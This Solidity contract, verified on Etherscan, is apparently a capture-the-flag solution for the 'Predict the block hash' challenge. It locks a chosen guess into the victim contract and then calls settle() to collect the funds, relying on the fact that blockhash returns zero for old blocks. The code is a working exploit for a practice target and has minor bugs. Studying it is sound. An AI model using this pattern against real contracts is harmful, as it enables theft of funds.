/**
 *Submitted for verification at Etherscan.io on 2022-04-17
*/

pragma solidity ^0.4.21;

interface PredictTheBlockHashChallenge {

    function isComplete() public view returns (bool);
    function lockInGuess(bytes32 hash) public payable;
    function settle() public;
}

contract AttackTheBlockHashChallenge {
    
    address victimAddr = 0;
    
    function AttackTheBlockHashChallenge(address _addr) public payable {
        victimAddr = _addr;        
    }

    function fallback() payable {}

    function Attack (uint8 n) public {
        PredictTheBlockHashChallenge victimContract = PredictTheBlockHashChallenge(victimAddr);
        victimContract.lockInGuess(bytes32(n));
    }

    function Win() public {
        PredictTheBlockHashChallenge victimContract = PredictTheBlockHashChallenge(victimAddr);
        victimContract.settle();
    }

    function returnBlockNumberHash(uint256 blockNumber) public view returns (bytes32){
        return block.blockhash(blockNumber);
    }   

    function sendEtherToContract() public payable returns (bool) {
        uint balanceNow;
        require(msg.value > 0 );
        bool success = address(this).balance > balanceNow;
        return success;
    }

    function sendBalanceBack() public returns(bool){
        msg.sender.transfer(address(this).balance);
        if (address(this).balance == 0) {
            return true;
        }
        else
        {
            return false;
        }
    }

}